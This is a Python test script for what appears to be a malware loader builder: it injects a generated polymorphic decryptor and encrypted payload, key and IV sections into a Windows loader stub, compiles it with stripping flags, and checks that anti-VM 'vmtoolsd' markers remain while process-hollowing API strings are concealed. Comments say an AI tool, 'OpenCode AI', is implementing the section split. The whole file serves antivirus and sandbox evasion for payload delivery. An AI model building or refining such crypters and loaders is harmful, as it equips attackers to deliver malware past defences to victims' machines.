#!/usr/bin/env python3
"""
test_stub_4sec.py — isolated stub test (does NOT touch build_v5.py).

Simulates the 4-section split OpenCode AI is implementing in build_v5.py:
  - 4 payload sections + 1 key section + 1 IV section
  - injects a REAL polymorphic decryptor (from polymorphic_decryptor.py)
  - compiles with the exact production flags
  - reports .text size (setup_check growth), CRT imports, section list

Usage: python3 test_stub_4sec.py
"""
import os, re, struct, subprocess, sys

ROOT = os.path.dirname(os.path.abspath(__file__))
STUB_SRC   = os.path.join(ROOT, "loader_stub_v5.cpp")
STUB_TMP   = os.path.join(ROOT, "loader_stub_v5.test4.cpp")
STUB_EXE   = os.path.join(ROOT, "loader_stub_v5.test4.exe")
RES        = os.path.join(ROOT, "resource.res")

# --- 1) real polymorphic decryptor ---
sys.path.insert(0, ROOT)
from polymorphic_decryptor import generate as gen_decryptor
decryptor_code = gen_decryptor()
print(f"[+] Generated real polymorphic decryptor ({len(decryptor_code):,} chars)")

# --- 2) simulate a 4-section injection (what OpenCode will emit) ---
PAYLOAD_SECS = [".wksp1", ".wksp2", ".wksp3", ".wksp4"]   # 4 sections
KEY_SEC      = ".mkeyx"
IV_SEC       = ".mivxx"
BPV          = [128, 128, 132, 140]                       # >= 128 (new contract)
BTV          = [256, 256, 256, 256]

sn_c  = ", ".join(f'"{n}"' for n in PAYLOAD_SECS)
sll_c = ", ".join(str(len(n)) for n in PAYLOAD_SECS)
bp_c  = ", ".join(str(b) for b in BPV)
bt_c  = ", ".join(str(b) for b in BTV)

section_code = (
    f'    BYTE* kd; DWORD ks; BYTE* ivd; DWORD ivs;\n'
    f'    if (!fs("{KEY_SEC}", {len(KEY_SEC)}, &kd, &ks) || ks < 32) return 2;\n'
    f'    if (!fs("{IV_SEC}", {len(IV_SEC)}, &ivd, &ivs) || ivs < 16) return 3;\n'
    f'    BYTE key[32], iv[16];\n'
    f'    xmc(key, kd, 32); xmc(iv, ivd, 16);\n'
    f'    const char* sn[] = {{{sn_c}}};\n'
    f'    const int sll[] = {{{sll_c}}};\n'
    f'    const DWORD bpv[] = {{{bp_c}}};\n'
    f'    const DWORD btv[] = {{{bt_c}}};\n'
)

with open(STUB_SRC, "r") as f:
    src = f.read()

poly_ph = "// @POLYMORPHIC_DECRYPTOR@"
sec_ph  = "// @SECTION_NAMES@"
assert src.count(poly_ph) == 1, f"decryptor marker count = {src.count(poly_ph)}"
assert src.count(sec_ph) == 1,  f"section marker count   = {src.count(sec_ph)}"
src = src.replace(poly_ph, decryptor_code, 1)
src = src.replace(sec_ph,  section_code, 1)

with open(STUB_TMP, "w") as f:
    f.write(src)
print(f"[+] Wrote injected stub to {STUB_TMP}")

# --- 3) compile with production flags ---
cmd = [
    "x86_64-w64-mingw32-g++", "-std=c++11", "-O2", "-fno-builtin", "-s",
    STUB_TMP, "-o", STUB_EXE,
    "-nostartfiles", "-e", "WinMain", "-Wl,--strip-all",
    RES if os.path.exists(RES) else os.devnull,
]
print(f"[+] Compiling: {' '.join(cmd)}")
r = subprocess.run(cmd, capture_output=True, timeout=600)
if r.returncode != 0:
    print("FAILED:\n" + r.stderr.decode()[-2000:])
    sys.exit(1)
print(f"[+] Compiled OK")

# --- 4) verify .text size, CRT imports, sections ---
def run(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True).stdout

size = os.path.getsize(STUB_EXE)
print(f"\n=== RESULTS (exe = {size:,} bytes) ===")

# .text section size
txt = run(f'objdump -h {STUB_EXE} 2>/dev/null | grep " .text "')
m = re.search(r"\.text\s+\S+\s+([0-9a-fA-F]+)", txt)
print(f"[text] .text size = {int(m.group(1), 16):,} bytes" if m else "[text] .text NOT FOUND!")

# CRT imports (0 = good)
crt = run(f'objdump -p {STUB_EXE} 2>/dev/null | grep -c "api-ms-win-crt"')
print(f"[crt ] UCRT imports = {crt.strip()} (0 expected)")

# DLL imports
dlls = run(f'objdump -p {STUB_EXE} 2>/dev/null | grep "DLL Name"')
print(f"[dlls] {dlls.strip()}")

# sandbox markers still present (wide strings)
vm = run(f'xxd {STUB_EXE} | grep -ci "7600 6d00 7400"')   # "vmtoolsd" UTF-16LE
print(f"[sbx ] vmtoolsd wide-string refs = {vm.strip()} (>0 expected)")

# hollowing APIs gone
hollow = run(f'strings {STUB_EXE} | grep -icE "CreateProcessA|WriteProcessMemory|CreateRemoteThread|notepad"')
print(f"[holl] hollowing API refs = {hollow.strip()} (0 expected)")

print("\nTEST COMPLETE")
